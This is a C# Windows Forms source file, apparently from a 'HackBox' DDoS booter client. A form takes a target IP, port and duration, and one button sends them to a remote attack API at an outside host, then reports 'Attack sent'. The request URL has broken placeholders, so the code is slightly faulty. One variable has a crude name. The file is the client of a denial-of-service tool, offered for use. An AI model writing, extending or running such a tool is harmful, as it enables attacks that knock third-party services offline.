using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace HackBox
{
	public partial class Form2 : Form
	{
		public Form2()
		{
			InitializeComponent();
		}

		private void Form2_Load(object sender, EventArgs e)
		{

		}

		private void button1_Click(object sender, EventArgs e)
		{
			string ip = host.Text;
			string port = hostPort.Text;
			string time = hostTime.Text;
		

			WebClient wc = new WebClient { }; wc.DownloadString($"http://reaping.kowaiontop.xyz/api.php?key=waiting&host=%7Bip%7D&port=%7Bport%7D&time=%7Btime%7D&method=%7Bmethod");
			MessageBox.Show($"Attack sent to {ip} using port {port} for {time} Second/s");
		}

		private void button2_Click(object sender, EventArgs e)
		{
			this.Hide();
			Form1 penis = new Form1();
			penis.ShowDialog();
			this.Close();
		}
	}
}
